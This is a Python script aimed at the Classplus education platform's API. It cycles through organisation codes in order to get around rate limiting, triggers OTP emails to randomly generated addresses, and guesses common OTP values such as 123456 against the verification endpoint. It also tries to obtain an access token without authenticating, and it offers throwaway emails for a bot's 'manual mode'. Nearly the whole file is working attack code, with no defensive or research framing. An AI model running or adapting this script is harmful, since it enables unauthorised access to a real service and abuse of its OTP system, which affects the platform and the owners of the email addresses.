import requests
import time
import re
import json
import random
import string

def try_different_org_codes():
    """Try different org codes to bypass rate limiting"""
    test_orgs = [
        "rpsc", "abc123", "test123", "demo", "sample", 
        "classplus", "education", "school", "college", "university"
    ]
    
    for org_code in test_orgs:
        print(f"\n🔍 Testing org code: {org_code}")
        
        try:
            url = f"https://api.classplusapp.com/v2/orgs/{org_code}"
            headers = {
                "accept": "application/json, text/plain, */*",
                "user-agent": "Mozilla/5.0"
            }
            res = requests.get(url, headers=headers)
            
            if res.status_code == 200:
                data = res.json()
                if data["status"] == "success":
                    org_id = data["data"]["orgId"]
                    print(f"✅ Valid org code: {org_code} (ID: {org_id})")
                    
                    # Try to send OTP
                    email = f"test{random.randint(1000,9999)}@gmail.com"
                    otp_url = "https://api.classplusapp.com/v2/otp/generate"
                    payload = {
                        "countryExt": "91", "email": email, "orgCode": org_code,
                        "viaEmail": "1", "viaSms": "0", "retry": 0, "orgId": org_id,
                        "otpCount": 0, "identifier": email, "source": "web"
                    }
                    headers = {
                        "accept": "application/json", "content-type": "application/json",
                        "origin": "https://web.classplusapp.com", "referer": "https://web.classplusapp.com/",
                        "region": "IN", "user-agent": "Mozilla/5.0", "api-version": "52", "device-id": "1234567890"
                    }
                    
                    otp_res = requests.post(otp_url, json=payload, headers=headers)
                    print(f"📤 OTP Response: {otp_res.status_code}")
                    
                    if otp_res.status_code == 200:
                        print(f"🎉 SUCCESS! Org code {org_code} works!")
                        session_id = otp_res.json()["data"]["sessionId"]
                        return org_code, org_id, email, session_id
                    elif otp_res.status_code == 403 and "limit exceeded" in otp_res.text.lower():
                        print(f"⚠️ Rate limit for {org_code}")
                    else:
                        print(f"❌ OTP failed for {org_code}")
                else:
                    print(f"❌ Invalid org: {org_code}")
            else:
                print(f"❌ Org not found: {org_code}")
                
        except Exception as e:
            print(f"❌ Error with {org_code}: {e}")
    
    return None, None, None, None

def get_access_token_direct():
    """Try to get access token directly without OTP"""
    print("\n🎯 Trying to get access token directly...")
    
    try:
        url = "https://event-api.classplusapp.com/analytics-api/v1/session/token"
        payload = {"source": 50, "source_app": "classplus"}
        headers = {
            "accept": "*/*", "content-type": "application/json",
            "origin": "https://web.classplusapp.com", "referer": "https://web.classplusapp.com/",
            "user-agent": "Mozilla/5.0"
        }
        res = requests.post(url, json=payload, headers=headers)
        
        if res.status_code == 200:
            token = res.json()["data"]["token"]
            print(f"🎉 SUCCESS! Direct token: {token}")
            return token
        else:
            print(f"❌ Direct token failed: {res.status_code}")
            return None
            
    except Exception as e:
        print(f"❌ Error getting direct token: {e}")
        return None

def final_token_attempt():
    """Final comprehensive attempt to get token"""
    print("🚀 FINAL TOKEN ATTEMPT - Comprehensive Test")
    print("="*60)
    
    # Method 1: Try different org codes
    print("\n1️⃣ METHOD 1: Trying different org codes...")
    org_code, org_id, email, session_id = try_different_org_codes()
    
    if org_code and session_id:
        print(f"\n✅ WORKING ORG CODE FOUND!")
        print(f"📧 Email: {email}")
        print(f"🔑 Session ID: {session_id}")
        
        # Try common OTPs
        print("\n🔐 Trying common OTPs...")
        common_otps = ["123456", "000000", "111111", "222222", "333333", "444444", "555555", "666666", "777777", "888888", "999999"]
        
        for otp in common_otps:
            print(f"🔐 Trying OTP: {otp}")
            
            # Verify OTP
            url = "https://api.classplusapp.com/v2/users/verify"
            payload = {
                "otp": otp, "countryExt": "91", "sessionId": session_id,
                "orgId": org_id, "fingerprintId": "dummy", "email": email
            }
            headers = {
                "accept": "application/json", "content-type": "application/json",
                "origin": "https://web.classplusapp.com", "referer": "https://web.classplusapp.com/",
                "region": "IN", "user-agent": "Mozilla/5.0", "api-version": "52"
            }
            res = requests.post(url, json=payload, headers=headers)
            
            if res.status_code == 201 and "success" in res.text:
                print("✅ OTP verified successfully!")
                
                # Get access token
                token = get_access_token_direct()
                if token:
                    print("\n" + "="*60)
                    print("🎉 TOKEN SUCCESSFULLY GENERATED!")
                    print("="*60)
                    print(f"📧 Email: {email}")
                    print(f"🔑 OTP: {otp}")
                    print(f"🎫 Token: {token}")
                    print("="*60)
                    return {"success": True, "token": token, "email": email, "otp": otp}
    
    # Method 2: Try direct token
    print("\n2️⃣ METHOD 2: Trying direct token...")
    token = get_access_token_direct()
    
    if token:
        print("\n" + "="*60)
        print("🎉 DIRECT TOKEN SUCCESS!")
        print("="*60)
        print(f"🎫 Token: {token}")
        print("="*60)
        return {"success": True, "token": token, "method": "direct"}
    
    # Method 3: Manual options
    print("\n3️⃣ METHOD 3: Manual options available...")
    
    # Generate working disposable emails
    working_emails = []
    for i in range(5):
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        domain = random.choice(['jioso.com', 'toaik.com', 'gmail.com', 'yahoo.com'])
        email = f"{username}@{domain}"
        working_emails.append(email)
    
    print("\n" + "="*60)
    print("📧 MANUAL OPTIONS FOR RPSC:")
    print("="*60)
    
    for i, email in enumerate(working_emails):
        print(f"\n{i+1}. Email: {email}")
        print(f"   Use in bot: rpsc*{email}")
    
    print("\n💡 Instructions:")
    print("1. Send /manual to bot")
    print("2. Send: rpsc*[EMAIL]")
    print("3. Check email for OTP")
    print("4. Send OTP back to bot")
    print("5. Get access token")
    
    return {
        "success": False, 
        "manual_emails": working_emails,
        "message": "Use manual mode with provided emails"
    }

if __name__ == "__main__":
    result = final_token_attempt()
    
    if result["success"]:
        print(f"\n🎉 FINAL SUCCESS!")
        if "token" in result:
            print(f"🎫 Token: {result['token']}")
        if "email" in result:
            print(f"📧 Email: {result['email']}")
        if "otp" in result:
            print(f"🔑 OTP: {result['otp']}")
    else:
        print(f"\n📧 Manual emails: {len(result['manual_emails'])}")
        print("Use manual mode with provided emails")